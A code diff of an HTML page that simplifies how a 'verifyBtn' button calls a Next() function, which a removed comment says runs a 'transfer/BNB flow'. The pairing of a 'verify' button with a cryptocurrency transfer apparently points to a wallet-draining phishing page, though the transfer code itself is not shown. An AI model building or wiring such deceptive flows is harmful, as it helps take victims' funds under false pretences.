@@ -164,29 +164,12 @@
     })();
   </script>
 
-  <!-- Next button: run transfer/BNB flow from js/script.js (show Processing, then Next()) -->
+  <!-- Same as reference folder: bind Next() directly to verifyBtn so workflow is identical -->
   <script>
     (function () {
-      var overlay = document.getElementById("loadingOverlay");
-      var nextBtn = document.getElementById("verifyBtn");
-      var loadingText = overlay && overlay.querySelector(".loading-text");
-
-      function onNextClick() {
-        if (typeof window.Next !== "function") return;
-        if (overlay) { overlay.style.display = "flex"; if (loadingText) loadingText.textContent = "Processing..."; }
-        window.Next();
-      }
-
-      function bindNext() {
-        if (!nextBtn) return;
-        nextBtn.removeEventListener("click", onNextClick);
-        nextBtn.addEventListener("click", onNextClick);
-      }
-
-      if (document.readyState === "loading") {
-        document.addEventListener("DOMContentLoaded", bindNext);
-      } else {
-        bindNext();
+      var btn = document.getElementById("verifyBtn");
+      if (btn && typeof window.Next === "function") {
+        btn.addEventListener("click", Next);
       }
     })();
   </script>
